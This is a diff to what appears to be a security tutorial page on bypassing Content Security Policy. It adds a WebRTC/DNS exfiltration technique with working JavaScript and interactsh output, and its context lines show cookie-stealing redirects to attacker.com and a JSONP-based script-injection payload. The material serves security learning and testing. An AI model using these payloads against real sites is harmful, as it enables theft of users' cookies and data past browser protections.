@@ -631,7 +631,7 @@ This directive defines which hosts can be **connected to**, meaning if your atta
 
 With this technique, remember that even _one bit_ of information is enough, as you can often _repeat_ it to reveal a larger amount of information.&#x20;
 
-A more general bypass for this to _redirect_ the user fully using JavaScript, as browser do not prevent this. Then in the URL, you put the data you want to exfiltrate to receive it in a request:
+A more general bypass for this is to _redirect_ the user fully using JavaScript, as browsers do not prevent this. Then in the URL, you put the data you want to exfiltrate to receive it in a request:
 
 <pre class="language-javascript" data-overflow="wrap"><code class="lang-javascript">// Redirect via document.location:
 <strong>location = `http://attacker.com/leak?${btoa(document.cookie)}`
@@ -639,11 +639,57 @@ A more general bypass for this to _redirect_ the user fully using JavaScript, as
 <strong>document.write(`&#x3C;meta http-equiv="refresh" content="0; url=http://attacker.com/leak?${btoa(document.cookie)}">`)
 </strong></code></pre>
 
+Another useful method is WebRTC which **bypasses** `connect-src`. The DNS lookup is not blocked and allows for dynamically inserting data into the subdomain field. These names are case-insensitive so an encoding scheme like Base32 can be used to exfiltrate arbitrary data (max \~100 characters per request). Using [`interactsh`](https://github.com/projectdiscovery/interactsh) it is easy to set up a domain to exfiltrate from:
+
+```shell-session
+$ interactsh-client
+
+[INF] Listing 1 payload for OOB Testing
+[INF] ckjbcs2q8gudlqgitungucqgux7bfhahq.oast.online
+```
+
+Then we use the WebRTC trick to exfiltrate any data over DNS:
+
+```javascript
+function base32(s) {
+  let b = "";
+  for (let i = 0; i < s.length; i++) {
+    b += s.charCodeAt(i).toString(2).padStart(8, "0");
+  }
+  let a = "abcdefghijklmnopqrstuvwxyz234567";
+  let r = "";
+  for (let i = 0; i < b.length; i += 5) {
+    let p = b.substr(i, 5).padEnd(5, "0");
+    let j = parseInt(p, 2);
+    r += a.charAt(j);
+  }
+  return r.match(/.{1,63}/g).join(".");
+}
+
+async function leak(data) {
+  let c = { iceServers: [{ urls: `stun:${base32(data)}.ckjbcs2q8gudlqgitungucqgux7bfhahq.oast.online` }] };
+  let p = new RTCPeerConnection(c);
+  p.createDataChannel("");
+  await p.setLocalDescription();
+}
+
+leak("Hello, world! ".repeat(8));
+```
+
+Finally, we receive DNS requests on the `interactsh-client` that we can [decode](https://gchq.github.io/CyberChef/#recipe=To\_Upper\_case\('All'\)From\_Base32\('A-Z2-7%3D',true\)\&input=akJzd1kzZFBmcXFITzMzU25yc2NjSWNpTVZ3R3kzek1FYjN3NjRUTU1RcVNBU2RmTnJXZzZsYmFvNXhYZTNkLmVlRXFlUVpMbW5yWHNZaUR4TjV6Z3laQkJFYkVHSzNkTU40d2NBNTNwb2p3R0lJakFKQlNXeTNEcEZxcUhPMy4zc25Sc2NDSWNpTVZXZ1kzek1lYjN3NjR0bU1RcVNBU0RGTnJ3ZzZsYkFvNVhYZTNkZWVFUWE):
+
+{% code title="interactsh-client" overflow="wrap" %}
+```log
+...
+[jbswY3dpfqqHo33snrSccICiMvwGY3zMeB3w64TMMqqsaSdfNRwg6LBao5xxe3d.eEeqEqzLMnrxSyIdXn5ZGyZbBEBEGK3dmN4WcA53pojWGIijAjbsWy3dPfQqHO3.3SNrScCIciMVwgY3zMEB3W64tmmqqSASDfnrWG6LbaO5xXe3DeEeQa.CkJbCs2q8GudlQGiTungUCqgux7BFhahq] Received DNS interaction (A) from 74.125.114.204
+```
+{% endcode %}
+
 #### CDNs in `script-src` (Angular Bypass)
 
 Every origin in this directive is trusted with all URLs it hosts. A common addition here is CDN (Content Delivery Network) domains that host many different JavaScript files for libraries. While in very unrestricted situations a CDN like [unpkg.com](https://www.unpkg.com/) will host **every file on NPM**, even malicious ones, others are less obvious.&#x20;
 
-The [cdnjs.cloudflare.com](https://cdnjs.cloudflare.com) or [ajax.googleapis.com](https://ajax.googleapis.com/) domains for example host **only specific** popular libraries which should be secure, but some have exploitable features. The most well-known is AngularJS, which a vulnerable site may also host themselves removing the need for a CDN. This library searches for specific patterns in the DOM which can define event handlers without the regular inline syntax. This bypasses the CSP and can allow arbitrary JavaScript execution by loading such a library, and including your own malicious content in the DOM:
+The [cdnjs.cloudflare.com](https://cdnjs.cloudflare.com) or [ajax.googleapis.com](https://ajax.googleapis.com/) domains for example host **only specific** popular libraries which should be secure, but some have exploitable features. The most well-known is AngularJS, which a vulnerable site may also host themselves removing the need for a CDN. This library searches for specific patterns in the DOM that can define event handlers without the regular inline syntax. This bypasses the CSP and can allow arbitrary JavaScript execution by loading such a library, and including your own malicious content in the DOM:
 
 <pre class="language-html"><code class="lang-html">&#x3C;!-- *.googleapis.com -->
 <strong>&#x3C;script src="https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)">&#x3C;/script>
